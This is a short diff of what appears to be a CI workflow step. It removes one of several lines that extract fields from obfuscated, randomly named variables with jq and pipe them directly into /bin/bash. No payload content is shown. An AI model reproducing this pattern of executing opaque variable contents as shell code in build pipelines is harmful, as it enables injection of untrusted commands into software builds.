@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$taog6" | jq -r .m8398 | /bin/bash
           echo $qyi8267 | jq -r .t431 | /bin/bash
-          echo $ds20 | jq -r .sp39183 | /bin/bash
           printf '%s' "$pprb4" | jq -r .v12 | /bin/bash
 
       - name: Save output
